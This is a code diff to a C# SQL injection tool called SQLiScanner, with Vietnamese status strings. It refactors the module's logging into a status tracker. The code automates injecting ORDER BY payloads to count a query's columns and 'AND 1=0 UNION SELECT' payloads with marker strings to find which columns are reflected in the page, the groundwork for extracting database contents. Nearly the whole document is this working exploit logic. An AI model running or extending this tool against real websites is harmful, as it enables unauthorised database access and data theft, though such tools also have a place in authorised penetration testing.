@@ -4,7 +4,7 @@ using SQLiScanner.Utility;
 using System;
 using System.Collections.Generic;
 using System.Linq;
-using System.Net.Http; // Cần thêm cái này
+using System.Net.Http;
 using System.Threading.Tasks;
 
 namespace SQLiScanner.Modules
@@ -17,81 +17,59 @@ namespace SQLiScanner.Modules
             _client = client;
         }
 
-        public async Task<int> GetColumnCountAsync(CrawlResult target, DetectionResult detectedData)
+        public async Task<int> GetColumnCountAsync(
+            CrawlResult target, 
+            DetectionResult detectedData, 
+            PayloadState trackingState)
         {
-            Console.WriteLine("\n[+] BẮT ĐẦU DÒ SỐ CỘT (ORDER BY)");
-            Console.WriteLine($"    [*] Target Param: {detectedData.VulnerableParam}");
-
+            trackingState.UpdateStatus(ScanStatus.CheckingColumnCount, "Đang dò số cột bằng ORDER BY...");
             string originalValue = target.Params[detectedData.VulnerableParam];
             int baseLength = await GetResponseLengthAsync(target, detectedData.VulnerableParam, originalValue);
 
-            Console.WriteLine($"    [*] Base Length (Clean): {baseLength} bytes");
-
-            if (baseLength <= 0)
-            {
-                Console.ForegroundColor = ConsoleColor.Red;
-                Console.WriteLine("[-] Không thể lấy nội dung của web. Target có thể đã chết hoặc chặn kết nối.");
-                Console.ResetColor();
-                return -1;
-            }
+            if (baseLength <= 0) return -1;
 
             for (int i = 1; i <= 50; i++)
             {
-                // Payload: value' ORDER BY 1 -- 
                 string payload = $"{originalValue}{detectedData.WorkingPrefix} ORDER BY {i}{detectedData.WorkingSuffix}";
-
                 int currentLength = await GetResponseLengthAsync(target, detectedData.VulnerableParam, payload);
 
                 bool isError = Math.Abs(currentLength - baseLength) > baseLength * 0.2;
 
                 if (isError)
                 {
-                    if (i == 1)
-                    {
-                        Console.ForegroundColor = ConsoleColor.Red;
-                        Console.WriteLine($"[-] Lỗi ngay tại ORDER BY 1. Prefix [{detectedData.WorkingPrefix}] có thể chưa chuẩn hoặc WAF chặn.");
-                        Console.WriteLine($"    Kích thước gốc: {baseLength} | Kích thước hiện tại: {currentLength}");
-                        Console.ResetColor();
-                        return -1;
-                    }
-
-                    int colCount = i - 1;
-                    Console.ForegroundColor = ConsoleColor.Green;
-                    Console.WriteLine($"[!] ORDER BY {i} gây lỗi -> Số cột là: {colCount}");
-                    Console.ResetColor();
-                    return colCount;
+                    if (i == 1) return -1;
+                    return i - 1;
                 }
                 else
                 {
-                    Console.Write($"\r    Checking ORDER BY {i}: OK (Kích thước: {currentLength})    ");
+                    trackingState.UpdateStatus(ScanStatus.CheckingColumnCount, $"Đang dò cột thứ {i}...");
                 }
             }
 
-            Console.WriteLine();
-            Console.ForegroundColor = ConsoleColor.Red;
-            Console.WriteLine($"[-] Thất bại. Đã thử 50 cột mà không thấy lỗi.");
-            Console.ResetColor();
             return -1;
         }
 
-        public async Task<List<int>> GetVisibleColumnsAsync(CrawlResult target, DetectionResult detectedData, int colCount)
+        public async Task<List<int>> GetVisibleColumnsAsync(
+            CrawlResult target, 
+            DetectionResult detectedData, 
+            int colCount,
+            PayloadState trackingState)
         {
-            Console.WriteLine("\n[+] Bắt đầu tìm cột hiển thị (UNION SELECT)");
-
+            trackingState.UpdateStatus(ScanStatus.ExploitingData, $"Đang tìm cột Text trong {colCount} cột...");
             List<int> visibleCols = new List<int>();
             string fromTable = detectedData.DatabaseType == DatabaseType.Oracle ? " FROM DUAL" : "";
             string originalValue = target.Params[detectedData.VulnerableParam];
 
+            string[] payloadParts = new string[colCount];
             for (int i = 0; i < colCount; i++)
             {
-                var payloadParts = Enumerable.Repeat("NULL", colCount).ToList();
+                trackingState.UpdateStatus(ScanStatus.ExploitingData, $"Đang thử inject cột {i + 1}/{colCount}...");
+                for (int j = 0; j < colCount; j++) payloadParts[j] = "NULL";
 
                 string magicTag = $"99{i + 1:D2}"; // VD: 9901
-                string magicString = $"'{magicTag}'";
+                payloadParts[i] = $"'{magicTag}'";
 
-                payloadParts[i] = magicString;
                 string unionPart = string.Join(",", payloadParts);
-
                 string payload = $"{originalValue}{detectedData.WorkingPrefix} AND 1=0 UNION SELECT {unionPart}{fromTable}{detectedData.WorkingSuffix}";
 
                 try
@@ -101,25 +79,10 @@ namespace SQLiScanner.Modules
 
                     if (!string.IsNullOrEmpty(html) && html.Contains(magicTag))
                     {
-                        Console.ForegroundColor = ConsoleColor.Green;
-                        Console.WriteLine($"[!] Cột số {i + 1} hiển thị được dữ liệu (Text/String).");
-                        Console.ResetColor();
                         visibleCols.Add(i + 1);
                     }
                 }
-                catch
-                {
-                    Console.ForegroundColor = ConsoleColor.Yellow;
-                    Console.WriteLine($"[-] Cột số {i + 1} KHÔNG hiển thị được dữ liệu.");
-                    Console.ResetColor();
-                }
-            }
-
-            if (visibleCols.Count == 0)
-            {
-                Console.ForegroundColor = ConsoleColor.Yellow;
-                Console.WriteLine("[-] KHÔNG TÌM THẤY PHẢN HỒI MONG MUỐN. (Cần phải sử dụng kĩ thuật Blind SQLi)");
-                Console.ResetColor();
+                catch {}
             }
 
             return visibleCols;
